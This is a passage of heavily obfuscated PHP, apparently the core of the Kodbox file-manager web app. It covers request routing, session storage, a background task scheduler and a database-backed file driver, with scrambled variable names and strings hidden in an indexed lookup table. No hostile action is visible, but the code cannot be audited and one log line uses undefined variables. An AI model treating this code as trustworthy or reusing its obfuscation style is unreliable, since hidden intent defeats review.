$_SERVER[³à¼î¯á]; $¬ê®éïÛ = parse_url($_SERVER[$äı–¿İË[1691]], PHP_URL_PATH); $ŸïÜïÚ = $_SERVER[$äı–¿İË[163]]; $ÇĞçùâí = array_keys(static::$patterns); $Ÿ€æœÊ³ = array_values(static::$patterns); $ ¢°Ëò = !1; self::$routes = preg_replace($äı–¿İË[1330], $äı–¿İË[8], self::$routes); if (in_array($¬ê®éïÛ, self::$routes)) { $Òç¶ö²² = array_keys(self::$routes, $¬ê®éïÛ); foreach ($Òç¶ö²² as $•©¶´³Ú) { if (self::$methods[$•©¶´³Ú] == $ŸïÜïÚ || self::$methods[$•©¶´³Ú] == $äı–¿İË[1692] || in_array($ŸïÜïÚ, self::$maps[$•©¶´³Ú])) { $ ¢°Ëò = !0; if (!is_object(self::$callbacks[$•©¶´³Ú])) { $­úò¶øß = explode($äı–¿İË[8], self::$callbacks[$•©¶´³Ú]); $¼¾áÔ¶“ = end($­úò¶øß); $¬°™ò¤Š = explode($äı–¿İË[1262], $¼¾áÔ¶“); $ª½ÑÑŠÃ = new $¬°™ò¤Š[0](); $ª½ÑÑŠÃ->{$¬°™ò¤Š[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$•©¶´³Ú]); if (self::$halts) { return; } } } } } else { $‘¾íÆÓç = 0; foreach (self::$routes as $•©¶´³Ú) { if (strpos($•©¶´³Ú, $äı–¿İË[4]) !== !1) { $•©¶´³Ú = str_replace($ÇĞçùâí, $Ÿ€æœÊ³, $•©¶´³Ú); } if (preg_match($äı–¿İË[1693] . $•©¶´³Ú . $äı–¿İË[1694], $¬ê®éïÛ, $Üû—©øï)) { if (self::$methods[$‘¾íÆÓç] == $ŸïÜïÚ || self::$methods[$‘¾íÆÓç] == $äı–¿İË[1692] || !empty(self::$maps[$‘¾íÆÓç]) && in_array($ŸïÜïÚ, self::$maps[$‘¾íÆÓç])) { $ ¢°Ëò = !0; array_shift($Üû—©øï); if (!is_object(self::$callbacks[$‘¾íÆÓç])) { $­úò¶øß = explode($äı–¿İË[8], self::$callbacks[$‘¾íÆÓç]); $¼¾áÔ¶“ = end($­úò¶øß); $¬°™ò¤Š = explode($äı–¿İË[1262], $¼¾áÔ¶“); $ª½ÑÑŠÃ = new $¬°™ò¤Š[0](); if (!method_exists($ª½ÑÑŠÃ, $¬°™ò¤Š[1])) { echo $äı–¿İË[1695]; } else { call_user_func_array(array($ª½ÑÑŠÃ, $¬°™ò¤Š[1]), $Üû—©øï); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$‘¾íÆÓç], $Üû—©øï); if (self::$halts) { return; } } } } $‘¾íÆÓç++; } } if ($ ¢°Ëò == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Œ—ãƒá =& $_SERVER[³à¼î¯á]; header($_SERVER[$Œ—ãƒá[1696]] . $Œ—ãƒá[1697]); echo $Œ—ãƒá[1698]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$äı–¿İË[1691]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ûÛ¼‰ =& $_SERVER[³à¼î¯á]; static $°ù±è‘£ = false; if ($°ù±è‘£) { return $°ù±è‘£; } $¢—«ıôŠ = $GLOBALS[$ûÛ¼‰[6]][$ûÛ¼‰[400]]; self::$sessionTime = $¢—«ıôŠ[$ûÛ¼‰[1699]]; $÷îˆ¢¶¨ = isset($GLOBALS[$ûÛ¼‰[1700]]) ? $GLOBALS[$ûÛ¼‰[1700]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($÷îˆ¢¶¨)) { self::$sessionSign = Cookie::get($÷îˆ¢¶¨); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($÷îˆ¢¶¨, self::$sessionSign, self::$sessionTime); $ô‰³ø£ = $¢—«ıôŠ[$ûÛ¼‰[1701]]; $ñ×ãùï¬ = $¢—«ıôŠ[$ô‰³ø£]; $ù¦èˆÂç = $¢—«ıôŠ[$ûÛ¼‰[872]]; switch ($ô‰³ø£) { case $ûÛ¼‰[21]: self::$handle = Model($ûÛ¼‰[873]); break; case $ûÛ¼‰[874]: self::$handle = new CacheRedis($ñ×ãùï¬, $ù¦èˆÂç); break; case $ûÛ¼‰[875]: self::$handle = new CacheMemcached($ñ×ãùï¬, $ù¦èˆÂç); break; case $ûÛ¼‰[221]: $ñ×ãùï¬[$ûÛ¼‰[87]] = $ñ×ãùï¬[$ûÛ¼‰[87]] . $ûÛ¼‰[1702]; self::$handle = new CacheFile($ñ×ãùï¬, $ù¦èˆÂç); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $°ù±è‘£ = new self(); return $°ù±è‘£; } public static function getBySign($¨ü¨‹š€) { $€ÂÊâ½¦ = self::$handle->get($¨ü¨‹š€); $€ÂÊâ½¦ = unserialize($€ÂÊâ½¦); return is_array($€ÂÊâ½¦) ? $€ÂÊâ½¦ : array(); } public static function setBySign($Ê‚Ã“ò‰, $ÙŒÏûÑ–) { CacheLock::lock($Ê‚Ã“ò‰); self::$handle->set($Ê‚Ã“ò‰, serialize($ÙŒÏûÑ–), self::$sessionTime); CacheLock::unlock($Ê‚Ã“ò‰); } public static function sign($ˆ·ÀÈâˆ = false) { if ($ˆ·ÀÈâˆ) { self::$sessionSign = $ˆ·ÀÈâˆ; } self::init(); return self::$sessionSign; } public static function set($”½»İüª, $„Ãğ©À = false) { self::init(); if (is_array($”½»İüª)) { foreach ($”½»İüª as $Œş…”¡Ò => $Üˆ­‚¥®) { array_set_value(self::$data, $Œş…”¡Ò, $Üˆ­‚¥®); } } else { array_set_value(self::$data, $”½»İüª, $„Ãğ©À); } self::setBySign(self::$sessionSign, self::$data); } public static function get($‰ö¢Í¼ü = false) { self::init(); if (!$‰ö¢Í¼ü) { return self::$data; } return array_get_value(self::$data, $‰ö¢Í¼ü); } public static function remove($»ÆÎÓÕõ) { self::init(); unset(self::$data[$»ÆÎÓÕõ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[³à¼î¯á][878])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $–¨Ò†íÎ =& $_SERVER[³à¼î¯á]; if (self::valueGet($–¨Ò†íÎ[795]) != $–¨Ò†íÎ[91]) { return; } if (self::valueGet($–¨Ò†íÎ[1703]) == $–¨Ò†íÎ[91]) { $·ğÚ…Ö = self::valueGet($–¨Ò†íÎ[1704]); if (time() - $·ğÚ…Ö > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($–¨Ò†íÎ[1703], $–¨Ò†íÎ[91]); self::log($–¨Ò†íÎ[1705] . ACTION . $–¨Ò†íÎ[1706]); Hook::bind($–¨Ò†íÎ[1707], $–¨Ò†íÎ[1708]); $ĞŠÓøÖ  = 0; while (!0) { self::cacheClear(); if (self::valueGet($–¨Ò†íÎ[795]) != $–¨Ò†íÎ[91]) { self::valueSet($–¨Ò†íÎ[1703], $–¨Ò†íÎ[219]); self::log($–¨Ò†íÎ[1709]); die; } $ÏŞêŞ£¸ = time(); if ($ÏŞêŞ£¸ - $ĞŠÓøÖ  >= 60) { self::valueSet(array($–¨Ò†íÎ[1703] => $–¨Ò†íÎ[91], $–¨Ò†íÎ[1704] => $ÏŞêŞ£¸)); $ĞŠÓøÖ  = $ÏŞêŞ£¸; } if (!file_exists(USER_SYSTEM . $–¨Ò†íÎ[1710])) { self::valueSet(array($–¨Ò†íÎ[1703] => $–¨Ò†íÎ[219], $–¨Ò†íÎ[795] => $–¨Ò†íÎ[219])); self::log($–¨Ò†íÎ[1711]); die; } $Úœªô£¶ = file_get_contents(BASIC_PATH . $–¨Ò†íÎ[1712]); $™€¨â°Ä = KOD_VERSION . $–¨Ò†íÎ[10] . KOD_VERSION_BUILD; $×±­ßôŒ = match_text($Úœªô£¶, $–¨Ò†íÎ[1713]) . $–¨Ò†íÎ[10] . match_text($Úœªô£¶, $–¨Ò†íÎ[1714]); if ($×±­ßôŒ != $™€¨â°Ä) { self::restart(); self::log("\x73\x74\157\x70\145\x64\x2e\x5b\166\145\x72\163\x69\157\156\x20\x75\x70\x64\141\x74\x65\x3b{$versionNow}\x20\75\x3e\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ÊÃ‹¤è =& $_SERVER[³à¼î¯á]; http_close(); $GLOBALS[$ÊÃ‹¤è[1715]] = 1; $_SERVER[$ÊÃ‹¤è[1716]] = $ÊÃ‹¤è[1717]; $_COOKIE = array(); $GLOBALS[$ÊÃ‹¤è[1718]] = 1; $GLOBALS[$ÊÃ‹¤è[1719]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $€²­–À =& $_SERVER[³à¼î¯á]; http_close(); self::valueSet($€²­–À[795], $€²­–À[219]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($€²­–À[1703] => $€²­–À[219], $€²­–À[795] => $€²­–À[91])); self::log($€²­–À[1720]); } public static function taskSwitch() { $’õÁ­™’ =& $_SERVER[³à¼î¯á]; $ÊîÔÔïë = self::valueGet($’õÁ­™’[795]) == $’õÁ­™’[91] ? $’õÁ­™’[219] : $’õÁ­™’[91]; self::valueSet($’õÁ­™’[795], $ÊîÔÔïë); } public static function shutdownEvent() { $Ã÷êÄ =& $_SERVER[³à¼î¯á]; self::valueSet($Ã÷êÄ[1703], $Ã÷êÄ[219]); self::log($Ã÷êÄ[1721]); } public static function config($—¾ÉÃÈ , $õ–ÁÄÓ™) { self::valueSet($_SERVER[³à¼î¯á][795], $—¾ÉÃÈ ); } private static function taskRunAll() { $Ï”ÔœûÕ =& $_SERVER[³à¼î¯á]; $¶á¼²İ“ = timeFloat(); $¥“’ì‡ = Model($Ï”ÔœûÕ[1722])->listData(); $›šö¾•Î = count($¥“’ì‡); for ($¾áÆÉ» = 0; $¾áÆÉ» < $›šö¾•Î; $¾áÆÉ»++) { $…ƒÑŞÔï = $¥“’ì‡[$¾áÆÉ»]; if (!$…ƒÑŞÔï[$Ï”ÔœûÕ[450]] || $…ƒÑŞÔï[$Ï”ÔœûÕ[1723]] != $Ï”ÔœûÕ[91]) { continue; } if (!self::taskTimeCheck($…ƒÑŞÔï)) { continue; } self::taskRun($…ƒÑŞÔï); } Hook::trigger($Ï”ÔœûÕ[1724]); self::taskQueueRun($¶á¼²İ“); } private static function taskQueueRun($‡Ö“ƒ”ö) { $õÚ”éÕ = 10; while (!0) { $´”Ë¼¢ = TaskQueue::run(); if ($´”Ë¼¢ === !1) { break; } if (timeFloat() - $‡Ö“ƒ”ö >= $õÚ”éÕ) { break; } } } private static function taskTimeCheck($–ïĞ‘·) { $¼Š¾¡Ìü =& $_SERVER[³à¼î¯á]; $÷ÇØãâŞ = json_decode($–ïĞ‘·[$¼Š¾¡Ìü[197]], !0); $ç†ƒ¿È¶ = intval($–ïĞ‘·[$¼Š¾¡Ìü[1704]]); $™Œ‘ü¹ö = strtotime($¼Š¾¡Ìü[1725] . $÷ÇØãâŞ[$¼Š¾¡Ìü[1726]] . $¼Š¾¡Ìü[1727]) - strtotime($¼Š¾¡Ìü[1728]); $¦Ø¸¹Ïâ = time() - strtotime(date($¼Š¾¡Ìü[1729]) . $¼Š¾¡Ìü[1730]); $Ö™òŞÑÉ = $¦Ø¸¹Ïâ >= $™Œ‘ü¹ö && $¦Ø¸¹Ïâ <= $™Œ‘ü¹ö + 3600; switch ($÷ÇØãâŞ[$¼Š¾¡Ìü[33]]) { case $¼Š¾¡Ìü[1731]: if (time() - $ç†ƒ¿È¶ < 3600 * 24 * 30) { return !1; } if ($÷ÇØãâŞ[$¼Š¾¡Ìü[1731]] == date($¼Š¾¡Ìü[1732]) && $Ö™òŞÑÉ) { return !0; } break; case $¼Š¾¡Ìü[1733]: if (time() - $ç†ƒ¿È¶ < 3600 * 24 * 7) { return !1; } $ÒÑŞòÏö = date($¼Š¾¡Ìü[1734]) == 0 ? 7 : date($¼Š¾¡Ìü[1734]); if ($÷ÇØãâŞ[$¼Š¾¡Ìü[1733]] == $ÒÑŞòÏö && $Ö™òŞÑÉ) { return !0; } break; case $¼Š¾¡Ìü[1726]: if (time() - $ç†ƒ¿È¶ < 3600 * 24) { return !1; } if ($Ö™òŞÑÉ) { return !0; } break; case $¼Š¾¡Ìü[1735]: if (time() - $ç†ƒ¿È¶ >= floatval($÷ÇØãâŞ[$¼Š¾¡Ìü[1735]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $˜Ê‹Ù¾ =& $_SERVER[³à¼î¯á]; static $ê•ÖÄñ» = 0; $·Á´Ùßá = 300; if (!$ê•ÖÄñ») { $ê•ÖÄñ» = time(); } if (time() - $ê•ÖÄñ» < $·Á´Ùßá) { return; } $ê•ÖÄñ» = time(); $ù‰’¬Š¨ = Model($˜Ê‹Ù¾[553])->db($˜Ê‹Ù¾[12]); if ($ù‰’¬Š¨) { $ù‰’¬Š¨->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($˜Ê‹Ù¾[1736], $˜Ê‹Ù¾[1737]); die; } } public static function taskRun($èÍ¼Ë‹é) { $â‡ŒŸ×¿ =& $_SERVER[³à¼î¯á]; self::log($â‡ŒŸ×¿[1738] . $èÍ¼Ë‹é[$â‡ŒŸ×¿[450]] . $â‡ŒŸ×¿[1739] . $èÍ¼Ë‹é[$â‡ŒŸ×¿[32]] . $â‡ŒŸ×¿[1740] . $èÍ¼Ë‹é[$â‡ŒŸ×¿[1741]]); Model($â‡ŒŸ×¿[1722])->run($èÍ¼Ë‹é[$â‡ŒŸ×¿[450]]); $©ŠÄÒÚ = timeFloat(); $“ÌÅ¾Ú­ = $â‡ŒŸ×¿[12]; switch ($èÍ¼Ë‹é[$â‡ŒŸ×¿[33]]) { case $â‡ŒŸ×¿[358]: $’›Î¿£Ó = url_request($èÍ¼Ë‹é[$â‡ŒŸ×¿[1741]], $â‡ŒŸ×¿[252], !1, !1, !1, !1, 10); if ($’›Î¿£Ó[$â‡ŒŸ×¿[795]]) { $“ÌÅ¾Ú­ = strlen($’›Î¿£Ó[$â‡ŒŸ×¿[1256]]); } break; case $â‡ŒŸ×¿[251]: $“ÌÅ¾Ú­ = Hook::apply($èÍ¼Ë‹é[$â‡ŒŸ×¿[1741]]); default: break; } Model($â‡ŒŸ×¿[1742])->add(array($â‡ŒŸ×¿[1743] => $â‡ŒŸ×¿[12], $â‡ŒŸ×¿[1744] => $â‡ŒŸ×¿[219], $â‡ŒŸ×¿[33] => $â‡ŒŸ×¿[1745] . $èÍ¼Ë‹é[$â‡ŒŸ×¿[450]], $â‡ŒŸ×¿[1746] => json_encode(array($â‡ŒŸ×¿[32] => $èÍ¼Ë‹é[$â‡ŒŸ×¿[32]], $â‡ŒŸ×¿[1747] => timeFloat() - $©ŠÄÒÚ, $â‡ŒŸ×¿[344] => $“ÌÅ¾Ú­)))); $Ñåë‰­ = $“ÌÅ¾Ú­ ? $â‡ŒŸ×¿[1748] . $“ÌÅ¾Ú­ : $â‡ŒŸ×¿[12]; self::log($â‡ŒŸ×¿[1749] . $èÍ¼Ë‹é[$â‡ŒŸ×¿[450]] . $â‡ŒŸ×¿[168] . $Ñåë‰­); return !0; } public static function valueGet($°éú«³¤) { $åë×„³Ä =& $_SERVER[³à¼î¯á]; $É¤Ä’È› = $åë×„³Ä[1750]; $å©ğÓ€¦ = Model($åë×„³Ä[483])->get($°éú«³¤, $É¤Ä’È›); if (is_null($å©ğÓ€¦)) { Model($åë×„³Ä[483])->set($åë×„³Ä[795], $åë×„³Ä[91], $É¤Ä’È›); Model($åë×„³Ä[483])->set($åë×„³Ä[1703], $åë×„³Ä[219], $É¤Ä’È›); $å©ğÓ€¦ = Model($åë×„³Ä[483])->get($°éú«³¤, $É¤Ä’È›); } return $å©ğÓ€¦; } private static function valueSet($É³êÅ¢˜, $á¬ÖïÈ· = false) { $İ£×Æıá =& $_SERVER[³à¼î¯á]; $ªÉ¬ó¤° = $İ£×Æıá[1751]; CacheLock::lock($ªÉ¬ó¤°); $Æ€Í²Øâ = Model($İ£×Æıá[483])->set($É³êÅ¢˜, $á¬ÖïÈ·, $İ£×Æıá[1750]); CacheLock::unlock($ªÉ¬ó¤°); return $Æ€Í²Øâ; } protected static function log($¹§ü¨Ø¹) { write_log($¹§ü¨Ø¹, $_SERVER[³à¼î¯á][1737]); } private static function cacheClear() { $€‰Ö¸“ =& $_SERVER[³à¼î¯á]; Cache::clearMemory(Model($€‰Ö¸“[483])->cacheKey($€‰Ö¸“[1750])); Cache::clearMemory(Model($€‰Ö¸“[483])->cacheKey($€‰Ö¸“[1752])); Model($€‰Ö¸“[1722])->cacheClear(); self::closeDatabase(); } } goto cïÄºê²”Ë; bå³—¬å„: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ÖŒÁ¹¼³) { $this->pathParse = $ÖŒÁ¹¼³; $this->model = Model($_SERVER[³à¼î¯á][1388]); } public function getPath($»ÉìÉ³Ã) { return trim($»ÉìÉ³Ã, $_SERVER[³à¼î¯á][8]); } public function pathFather($³·´Ñ«˜) { $úä¢ ¾Õ = $this->parse($³·´Ñ«˜); $úä¢ ¾Õ = $this->infoSimple($³·´Ñ«˜); return $úä¢ ¾Õ ? $úä¢ ¾Õ[$_SERVER[³à¼î¯á][183]] : !1; } public function pathThis($£­õÆÇˆ) { $„òÊœƒ˜ = $this->infoSimple($£­õÆÇˆ); return $„òÊœƒ˜ ? $„òÊœƒ˜[$_SERVER[³à¼î¯á][32]] : !1; } public function getPathOuter($ËÕª™æ) { if (!$ËÕª™æ) { return $ËÕª™æ; } $ÙÕÏ›Õ = $this->parse($ËÕª™æ); return KodIO::make($ÙÕÏ›Õ[$_SERVER[³à¼î¯á][450]]); } public function copyFolderFromIO($„ üèÈ, $±…ÃÒï, $ŠÕÀü÷î, $óâÚ›šÇ, $ó£Êù€ª) { $³£Ğƒ„ = $this->model->copyFolderFromIO($„ üèÈ, $±…ÃÒï, $ŠÕÀü÷î, $óâÚ›šÇ, $ó£Êù€ª); return KodIO::make($³£Ğƒ„); } public function isParentOf($­ÌóîÁ, $Ë°‰éÆ’) { return $this->model->isParentOf($­ÌóîÁ, $Ë°‰éÆ’); } public function mkfile($ÚëåßŸÍ, $ªû½†øâ = '', $¯Ÿ‚¹ÚÌ = REPEAT_RENAME) { $ŒõŒâğ =& $_SERVER[³à¼î¯á]; $Í›¶Æô× = $this->parse($ÚëåßŸÍ); $ÚëåßŸÍ = $Í›¶Æô×[$ŒõŒâğ[450]]; for ($§°õî•² = 0; $§°õî•² < count($Í›¶Æô×[$ŒõŒâğ[1389]]); $§°õî•²++) { $¿ºÉ‘‚˜ = $Í›¶Æô×[$ŒõŒâğ[1389]][$§°õî•²]; if ($§°õî•² == count($Í›¶Æô×[$ŒõŒâğ[1389]]) - 1) { $ÚëåßŸÍ = $this->model->mkfile($ÚëåßŸÍ, $¿ºÉ‘‚˜, $ªû½†øâ, $¯Ÿ‚¹ÚÌ); break; } $ÚëåßŸÍ = $this->model->mkdir($ÚëåßŸÍ, $¿ºÉ‘‚˜, REPEAT_SKIP); } return $this->getPathOuter($ÚëåßŸÍ); } public function mkdir($ òµõ‰, $¬ƒçö—Œ = REPEAT_SKIP) { $¨ª¦´Ò® =& $_SERVER[³à¼î¯á]; $ÇİÕáüØ = $this->parse($ òµõ‰); $ òµõ‰ = $ÇİÕáüØ[$¨ª¦´Ò®[450]]; for ($‘ùÆ¯ûË = 0; $‘ùÆ¯ûË < count($ÇİÕáüØ[$¨ª¦´Ò®[1389]]); $‘ùÆ¯ûË++) { $ó›ËıÑ£ = $ÇİÕáüØ[$¨ª¦´Ò®[1389]][$‘ùÆ¯ûË]; $ òµõ‰ = $this->model->mkdir($ òµõ‰, $ó›ËıÑ£, $¬ƒçö—Œ); } return $this->getPathOuter($ òµõ‰); } public function copyFile($Öëé–óü, $Ğ¯äëƒà, $÷ï¾ãæ = REPEAT_REPLACE) { $¶¸¨ÊÃû =& $_SERVER[³à¼î¯á]; $ˆ¼¢ÆÒ = $this->parse($Ğ¯äëƒà); $çÎâıı = $this->model->copy($Öëé–óü, $ˆ¼¢ÆÒ[$¶¸¨ÊÃû[450]], $÷ï¾ãæ, $ˆ¼¢ÆÒ[$¶¸¨ÊÃû[87]]); return $çÎâıı ? $this->getPathOuter($çÎâıı) : !1; } public function moveFile($õúø²‡, $äÑâ·á, $í¿µ…˜ = REPEAT_REPLACE) { $ŞÆ¥úËÍ =& $_SERVER[³à¼î¯á]; $€øèıË× = $this->parse($äÑâ·á); $Ö«“ªæ = $this->model->move($õúø²‡, $€øèıË×[$ŞÆ¥úËÍ[450]], $í¿µ…˜, $€øèıË×[$ŞÆ¥úËÍ[87]]); return $Ö«“ªæ ? $this->getPathOuter($Ö«“ªæ) : !1; } public function copy($¾îÒıı¸, $‘éº´“®, $ø®‰«Ø¼ = REPEAT_REPLACE, $š”çò­† = false) { $‘±¥Ì¢½ = $this->parse($‘éº´“®); $â­³Ôš¼ = $this->model->copy($¾îÒıı¸, $‘±¥Ì¢½[$_SERVER[³à¼î¯á][450]], $ø®‰«Ø¼, $š”çò­†); return $â­³Ôš¼ ? $this->getPathOuter($â­³Ôš¼) : !1; } public function moveSameAllow() { } public function move($³‡¬¬ç, $ªîãÔèŞ, $ÌÙüé™Š = REPEAT_REPLACE, $ØáÅ¬Ï = false) { $Ê“Ğ…³Ù = $this->parse($ªîãÔèŞ); $éŞÉ²º§ = $this->model->move($³‡¬¬ç, $Ê“Ğ…³Ù[$_SERVER[³à¼î¯á][450]], $ÌÙüé™Š, $ØáÅ¬Ï); return $éŞÉ²º§ ? $this->getPathOuter($éŞÉ²º§) : !1; } public function remove($’ËàÉÑ, $ÄÍ¾ÒÆÙ = true) { return $this->model->remove($’ËàÉÑ, $ÄÍ¾ÒÆÙ); } public function rename($ÃÛ¿£Ğ, $›˜ıóƒ) { $¶ò‹‹¤ó = $this->model->rename($ÃÛ¿£Ğ, $›˜ıóƒ); return $¶ò‹‹¤ó ? $this->getPathOuter($ÃÛ¿£Ğ) : $¶ò‹‹¤ó; } public function size($âæÁÏ¨“) { $Ï´Úºœ˜ = $this->infoSimple($âæÁÏ¨“); return $Ï´Úºœ˜ ? $Ï´Úºœ˜[$_SERVER[³à¼î¯á][79]] : 0; } public function infoSimple($˜È¤‚ó) { return $this->model->sourceInfo($˜È¤‚ó); } public function info($ùşÈÖ“) { return $this->infoParse($ùşÈÖ“); } public function infoAuth($éÀæ“µû) { return $this->infoParse($éÀæ“µû, !1, !0); } public function infoWithChildren($“Ù‘·¦û) { return $this->infoParse($“Ù‘·¦û, !0); } protected function infoParse($“œ·Ã÷, $ªĞå–ˆ­ = false, $á¡Á€ÑĞ = false) { if (!$ªĞå–ˆ­) { return $this->model->pathInfo($“œ·Ã÷, $á¡Á€ÑĞ); } return $this->model->pathInfoMore($“œ·Ã÷); } public function infoFullSimple($ÛÎÉŒ²) { $èó¡«œÂ =& $_SERVER[³à¼î¯á]; $²­…¸Æ = explode($èó¡«œÂ[8], $ÛÎÉŒ²); $¹œá’çğ = implode($èó¡«œÂ[8], array_splice($²­…¸Æ, 1)); return $this->model->pathInfoByPath($²­…¸Æ[0], $¹œá’çğ); } public function infoFull($³®©±Ë) { $öºö»Íå = $this->infoFullSimple($³®©±Ë); return is_array($öºö»Íå) ? $this->model->pathInfo($öºö»Íå[$_SERVER[³à¼î¯á][184]]) : !1; } public function hashSimple($Ôıå™Šù) { $†ÏóÇÉÕ =& $_SERVER[³à¼î¯á]; $ëùÔÔ¾™ = $this->infoWithChildren($Ôıå™Šù); return $ëùÔÔ¾™[$†ÏóÇÉÕ[524]][$†ÏóÇÉÕ[647]]; } public function hashMd5($òÅçæ›Î) { $ÒÄ»òÆù =& $_SERVER[³à¼î¯á]; $ò¬Æ®­ = $this->infoWithChildren($òÅçæ›Î); return $ò¬Æ®­[$ÒÄ»òÆù[524]][$ÒÄ»òÆù[522]]; } public function exist($ãÆ«Ò·) { $ïåó¤Ú =& $_SERVER[³à¼î¯á]; $×¦§¥ûò = $this->parse($ãÆ«Ò·); if (!$×¦§¥ûò[$ïåó¤Ú[87]]) { return $this->isFile($ãÆ«Ò·) || $this->isFolder($ãÆ«Ò·); } $Şƒõ¡·Â = array($ïåó¤Ú[452] => $×¦§¥ûò[$ïåó¤Ú[450]], $ïåó¤Ú[32] => $×¦§¥ûò[$ïåó¤Ú[87]]); $ÏÎÒÂ« = $this->model->where($Şƒõ¡·Â)->find(); return $ÏÎÒÂ« ? !0 : !1; } public function isFile($®†ª£) { $Úé’ĞÂ© =& $_SERVER[³à¼î¯á]; $àòÒùº = $this->infoSimple($®†ª£); return $àòÒùº && $àòÒùº[$Úé’ĞÂ©[460]] == $Úé’ĞÂ©[219] ? !0 : !1; } public function isFolder($û…È·€¼) { $Øáó††« =& $_SERVER[³à¼î¯á]; $««¢‘ß = $this->infoSimple($û…È·€¼); return $««¢‘ß && $««¢‘ß[$Øáó††«[460]] == $Øáó††«[91] ? !0 : !1; } public function listPath($ŒÕüŞö, $Ë¼ğàÅä = false) { $€ÕÅ»»é =& $_SERVER[³à¼î¯á]; if ($ŒÕüŞö == $€ÕÅ»»é[12]) { return !1; } $Æøú»•à = array($€ÕÅ»»é[452] => $ŒÕüŞö); if ($Ë¼ğàÅä) { return $this->model->listSource($Æøú»•à, -1); } return $this->model->listSource($Æøú»•à); } public function has($¯ÜäçÈÜ, $íû…¡á = false, $€Ğ‘Úêü = null) { $É¢·—Å  =& $_SERVER[³à¼î¯á]; $Ä¡ÅÄ¸‰ = $this->infoWithChildren($¯ÜäçÈÜ); if ($íû…¡á) { return array($É¢·—Å [231] => $Ä¡ÅÄ¸‰[$É¢·—Å [231]], $É¢·—Å [230] => $Ä¡ÅÄ¸‰[$É¢·—Å [230]]); } return $€Ğ‘Úêü ? $Ä¡ÅÄ¸‰[$É¢·—Å [231]] : $Ä¡ÅÄ¸‰[$É¢·—Å [230]]; } public function listAll($şçˆÓÎğ) { $Ë˜®››õ = IO::info($this->pathParse[$_SERVER[³à¼î¯á][87]]); if (!$Ë˜®››õ) { return array(); } return $this->model->listAll($şçˆÓÎğ); } public function getContent($ôÈ¾îÒ) { return $this->model->getContent($ôÈ¾îÒ); } public function setContent($“Ù€Ê®, $Å Èà•À = '') { return $this->model->setContent($“Ù€Ê®, $Å Èà•À); } public function fileSubstr($ã·³–ÔÌ, $À¡¢ñë£, $µç¾Öã‚) { return $this->model->fileSubstr($ã·³–ÔÌ, $À¡¢ñë£, $µç¾Öã‚); } public function download($ä½Ê¢‘ô, $¾‚™ÀÑ = '') { $û¶òÚ´ = get_path_father($¾‚™ÀÑ); $Ş¾º³Š™ = get_path_this($¾‚™ÀÑ); $›ãúÒÆñ = $this->model->fileInfoGet($ä½Ê¢‘ô); $Ú“üı¯Õ = IO::copy($›ãúÒÆñ[$_SERVER[³à¼î¯á][87]], $û¶òÚ´, !1, $Ş¾º³Š™); return $Ú“üı¯Õ; } public function setModifyTime($µ°ºõê, $¾Ù»À³ = '') { $¤Ò ö•Æ =& $_SERVER[³à¼î¯á]; if (!$µ°ºõê) { return; } $this->model->where(array($¤Ò ö•Æ[466] => $µ°ºõê))->save(array($¤Ò ö•Æ[88] => $¾Ù»À³)); } public function upload($¯ú½ÜÜÍ, $±­¬ûÌ¹, $öúÀ¿¬Ñ = false, $ãø÷éÃú = REPEAT_REPLACE) { $Æ³öİ¶Ğ =& $_SERVER[³à¼î¯á]; $Ä‚Ğ†É­ = $this->parse($¯ú½ÜÜÍ); $”¹ÔÚÌŒ = $this->model->addFile($Ä‚Ğ†É­[$Æ³öİ¶Ğ[450]], $±­¬ûÌ¹, $Ä‚Ğ†É­[$Æ³öİ¶Ğ[87]], $öúÀ¿¬Ñ, $ãø÷éÃú); return $this->getPathOuter($”¹ÔÚÌŒ); } public function uploadFileByID($ÖèøˆÇö, $í¯†Öú, $îƒ•»°Ö) { $ù¦‡éê¡ =& $_SERVER[³à¼î¯á]; $ï¢¬Éì = $this->parse($ÖèøˆÇö); $äà©’õˆ = $this->model->addFileByFileID($ï¢¬Éì[$ù¦‡éê¡[450]], $í¯†Öú, $ï¢¬Éì[$ù¦‡éê¡[87]], $îƒ•»°Ö); return $this->getPathOuter($äà©’õˆ); } public function addFileByRemote($»«æÚáÑ, $…™æ‹¾, $ üµõ’‰ = array(), $ƒÃŞÅñâ = '', $ÊÆºëã) { $„çŸ´¦» =& $_SERVER[³à¼î¯á]; $ÉË‹‡ş® = $this->parse($»«æÚáÑ); $ƒÃŞÅñâ = empty($ƒÃŞÅñâ) ? $ÉË‹‡ş®[$„çŸ´¦»[87]] : $ƒÃŞÅñâ; $©¶€Ğî… = $this->model->addFileByRemote($ÉË‹‡ş®[$„çŸ´¦»[450]], $…™æ‹¾, $ƒÃŞÅñâ, $ üµõ’‰, $ÊÆºëã); return $this->getPathOuter($©¶€Ğî…); } public function uploadLink($‚ËŸ, $ìÒè’ÁÌ = 0) { $Îå˜÷ª™ =& $_SERVER[³à¼î¯á]; $ÔÒáœ‹ = $this->parse($‚ËŸ); $º¶ø€Î = _get($GLOBALS[$Îå˜÷ª™[7]], $Îå˜÷ª™[1390]); $ºâÂ‰¬ä = 